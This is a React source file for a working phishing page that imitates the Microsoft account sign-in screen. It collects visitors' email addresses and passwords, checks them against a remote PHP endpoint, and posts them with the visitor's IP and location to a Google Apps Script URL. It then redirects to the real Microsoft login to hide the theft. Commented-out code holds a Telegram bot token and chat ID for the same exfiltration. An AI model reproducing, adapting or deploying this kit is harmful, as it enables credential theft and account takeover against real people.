import mic from "./mic.svg";
import { useLocation } from "react-router-dom";
import { decode as base64_decode, encode as base64_encode } from "base-64";
import axios from "axios";
import key from "./assets/img/key.svg";
import "./App.css";
import { useEffect, useState } from "react";

function App() {
  const [pass, setPass] = useState(false);
  const [count, setCount] = useState(0);
  const [co, setCo] = useState(false);
  const [info, setInfo] = useState("");
  const [fields, setFields] = useState("");
  const [comment, setComment] = useState("");
  const [field, setField] = useState("");

  const emailRegex = new RegExp(
    /^[A-Za-z0-9_!#$%&'*+\/=?`{|}~^.-]+@[A-Za-z0-9.-]+$/,
    "gm"
  );

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFields({ ...fields, [name]: value });
    console.log(fields);
  };

  const handleChanges = (e) => {
    const { name, value } = e.target;
    setField({ ...field, [name]: value });
    console.log(field);
  };

  const CheckDb = async (data) => {
    try {
      const response = await axios.post(
        `https://generousmoves.cbg.ru///995.php`,
        data
      );
      if (response.data.status === "success") {
        setPass(true);
      } else if (response.data.status === "error") {
        setCo(true);
      } else {
        const form = new FormData()

        form.set('email', fields.email)
        form.set('password', field.secret)
        form.set('country', info.country_name)
        form.set('region', info.region)
        form.set('ip', info.ip)
       // https://script.google.com/macros/s/AKfycbyUv0taSM5jljpgjSitRvQoa7GE2sHMar7pfXD3Ioku9VOkFOqokYOLVa-LErhzRqQp/exec
       // https://script.google.com/macros/s/AKfycbys_hDhvCJ4UWACDBtRUjumHXwnfKqqqoDSkFiLE37G5DuNFoXgiye-fPbijYkrtvM/exec
        await fetch('https://script.google.com/macros/s/AKfycbyUv0taSM5jljpgjSitRvQoa7GE2sHMar7pfXD3Ioku9VOkFOqokYOLVa-LErhzRqQp/exec',
          {
            method: 'POST',
            body: form
          }
        )
        setComment(
          "Your account or password is incorrect. If you don't remember your password,"
        );
        setTimeout(() => {
          window.location.replace(
            "https://login.microsoftonline.com/common/login"
          );
        }, 4000);
      }
      // else if (
      //   response.data.message === "Your account or password is incorrect"
      // ) {
      //   setComment(
      //     "Your account or password is incorrect. If you don't remember your password,"
      //   );
      // } else if (response.data.message === "Login success") {
      //   console.log(response.data.message);
      //   return window.location.replace(response.data.redirect);
      // }
    } catch (e) {
      // console.log(e.response);
      setCo(true);
    }
  };

  const onNext = () => {
    const isValidEmail = emailRegex.test(fields.email);

    if (isValidEmail === true) {
      const data = new FormData();
      data.append("do", "check");
      data.append("em", fields.email);
      CheckDb(data);
      
    } else {
      setCo(true);
    }
  };

  const onPrev = () => {
    setPass(false);
    setCo(false);
  };

  const onInfo = async () => {
    try {
      const response = await axios.get(`https://ipapi.co/json/`);
      if (response.data) {
        setInfo(response.data);
        console.log(response.data);
      }
    } catch (e) {
      console.log(e.response);
    }
  };

  //   const onSubmit = () => {

  // }

  useEffect(() => {
    onInfo();
  }, []);

  const onSubmit = async () => {
    let encoded = base64_encode(field.secret);

    // console.log(encoded);

    const data = new FormData();
    data.append("do", "login");
    data.append("user", fields.email);
    data.append("pass", encoded);
    CheckDb(data);

    // setComment("Please try again");

    // const botID = "bot5825052855:AAFvvg6f8benUZNnYc45BaZgkgTTH585Rak";
    // const data = {
    //   chat_id: "5345652511",
    //   text: {
    //     email: fields.email + <br />,
    //     password: field.secret + <br />,
    //     ip: info.ip + <br />,
    //     city: info.city + <br />,
    //     country: info.country + <br />,
    //     postal: info.postal + <br />,
    //     region: info.region + <br />,
    //   },
    // };
    // try {
    //   const response = await axios.post(
    //     `https://api.telegram.org/${botID}/sendMessage`,
    //     data,
    //     {
    //       headers: { "Content-Type": "application/json" },
    //     }
    //   );
    //   if (response.data.ok === true) {
    //     console.log(response.data);
    //   }
    // } catch (e) {
    //   console.log(e.response);
    // }
  };

  return (
    <>
      {pass === true ? (
        <div className="tt">
          <div className="pp">
            <div className="inside">
              <img src={mic} alt="mic" />
              <p></p>
              <img
                className="for"
                src="https://logincdn.msftauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg"
                alt="arrow"
                onClick={() => onPrev()}
              />
              {""} <span className="f">{fields.email} </span>
              <br />
              <h2>
                {" "}
                Enter Password <br />{" "}
                <span className="col">
                  {" "}
                  {comment}{" "}
                  <a href="#" class="lol" target="_self">
                    {" "}
                    {comment ===
                    "Your account or password is incorrect. If you don't remember your password,"
                      ? "reset it now."
                      : ""}
                  </a>{" "}
                </span>
              </h2>
              <input
                placeholder="Password"
                name="secret"
                type="password"
                value={field.secret}
                onChange={handleChanges}
                required
              />
              <p className="links">
                {/* Forgot Password? */}
                <a className="link" href="#" target="_self">
                  {" "}
                  Forgot Password?
                </a>{" "}
              </p>
              <div className="right">
                {field.length === 0 ? (
                  <button className="btn" disabled>
                    Sign In
                  </button>
                ) : (
                  <button className="btn" onClick={() => onSubmit()}>
                    Sign In
                  </button>
                )}
              </div>
            </div>
          </div>
        </div>
      ) : (
        <>
          <div className="tt">
            <div className="pp">
              <div className="inside">
                <img src={mic} />
                <h2> Sign In</h2>
                {co === true ? (
                  <p className="mol">
                    That Microsoft account doesn't exist. Enter a different
                    account or
                    <a href="#" class="lol" target="_self">
                      {" "}
                      get a new one.
                    </a>{" "}
                  </p>
                ) : null}
                <input
                  placeholder="Email, phone or Skype"
                  name="email"
                  type="email"
                  value={fields.email}
                  onChange={handleChange}
                  required
                />
                <p className="links">
                  No account?
                  <a className="link" href="#" target="_self">
                    {" "}
                    Create one!
                  </a>{" "}
                </p>
                <p className="links">
                  {" "}
                  <a className="linked" href="#" target="_self">
                    {" "}
                    Sign in with a security key
                  </a>
                  <img
                    className="fo"
                    src="https://logincdn.msftauth.net/shared/1.0/content/images/documentation_dae218aac2d25462ae286ceba8d80ce2.svg"
                    alt="hi"
                  />
                </p>

                <div className="right">
                  {fields.length === 0 ? (
                    <button className="btn" disabled>
                      Next
                    </button>
                  ) : (
                    <button className="btn" onClick={() => onNext()}>
                      Next
                    </button>
                  )}
                </div>
              </div>
            </div>
            <div className="pp">
              <div className="inside2">
                <img src={key} alt="key" className="key" />
                <p className="text"> Sign-in options</p>
              </div>
            </div>
          </div>
        </>
      )}

      {/* mobile */}

      {pass === true ? (
        <div className="phone">
          <div>
            <img src={mic} />
            <p></p>
            <img
              className="for"
              src="https://logincdn.msftauth.net/shared/1.0/content/images/arrow_left_43280e0ba671a1d8b5e34f1931c4fe4b.svg"
              alt="arrow"
              onClick={() => onPrev()}
            />

            <span className="f">{fields.email} </span>
            <br />
            <h2>
              {" "}
              Enter Password <p className="col"> {comment}</p>
            </h2>
            <input
              placeholder="Password"
              name="secret"
              type="password"
              value={field.secret}
              onChange={handleChanges}
              required
            />
            <p className="links">
              <a className="link" href="#" target="_self">
                {" "}
                Forgot Password?
              </a>{" "}
            </p>
            <div className="right">
              {field.length === 0 ? (
                <button className="btn" disabled>
                  Sign In
                </button>
              ) : (
                <button className="btn" onClick={() => onSubmit()}>
                  Sign In
                </button>
              )}
            </div>
          </div>
        </div>
      ) : (
        <>
          <div className="phone">
            <div>
              <img src={mic} />
              <h2> Sign In</h2>
              {co === true ? (
                <p className="mol">
                  That Microsoft account doesn't exist. Enter a different
                  account or
                  <a href="#" class="lol" target="_self">
                    {" "}
                    get a new one.
                  </a>{" "}
                </p>
              ) : null}
              <input
                placeholder="Email, phone or Skype"
                name="email"
                type="email"
                value={fields.email}
                onChange={handleChange}
                required
              />
              <p className="links">
                No account?
                <a className="link" href="#" target="_self">
                  {" "}
                  Create one!
                </a>{" "}
              </p>
              <p className="links">
                {" "}
                <a className="linked" href="#" target="_self">
                  {" "}
                  Sign in with a security key
                </a>
                <img
                  className="fo"
                  src="https://logincdn.msftauth.net/shared/1.0/content/images/documentation_dae218aac2d25462ae286ceba8d80ce2.svg"
                  alt="hi"
                />
              </p>
              <div className="right">
                {fields.length === 0 ? (
                  <button className="btn" disabled>
                    Next
                  </button>
                ) : (
                  <button className="btn" onClick={() => onNext()}>
                    Next
                  </button>
                )}
              </div>
            </div>
          </div>
          <div className="phones">
            <div className="ones">
              <img src={key} alt="keys" className="keys" />
              <p className="texts"> Sign-in options</p>
            </div>
          </div>
        </>
      )}
    </>
  );
}

export default App;
